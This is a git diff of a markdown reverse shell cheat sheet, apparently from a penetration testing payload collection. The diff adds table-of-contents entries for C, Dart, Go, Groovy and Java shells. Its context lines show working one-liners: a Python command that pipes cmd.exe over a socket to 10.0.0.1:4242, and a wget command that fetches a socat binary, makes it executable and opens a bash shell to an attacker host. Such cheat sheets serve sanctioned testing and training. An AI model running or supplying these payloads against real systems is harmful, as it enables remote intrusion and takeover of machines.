@@ -7,6 +7,14 @@ If you come across any other methods please feel free to contribute to this part
 * [Awk](#awk)
 * [Bash TCP](#bash-tcp)
 * [Bash UDP](#bash-udp)
+* [C](#c)
+* [Dart](#dart)
+* [Golang](#golang)
+* [Groovy](#groovy)
+* [Groovy alternative 1](#groovy-alternative-1)
+* [Java](#java)
+* [Java alternative 1](#java-alternative-1)
+* [Java alternative 2](#java-alternative-2)
 * [Powershell](#powershell)
 * [Python](#python)
 * [Rust](#rust)
@@ -16,6 +24,7 @@ If you come across any other methods please feel free to contribute to this part
 * [Telnet](#telnet)
 * [War](#war)
 * [Spawn TTY Shell](#spawn-tty-shell)
+* [Stabalize Your Shells](#stabalize-your-shells)
 
 ### Awk
 
@@ -288,9 +297,6 @@ python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 42
 ```
 python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
 ```
-
-
-
 ### Ruby
 
 ```
@@ -331,7 +337,6 @@ hacker@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0
 hacker@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.x.x:1337
 ```
 
-
 ### Telnet
 
 ```
@@ -360,3 +365,4 @@ rlwrap -r -f . nc 10.0.0.1 4242
 -f . will make rlwrap use the current history file as a completion word list.
 -r Put all words seen on in- and output on the completion list.
 ```
+### Stabalize Your Shells
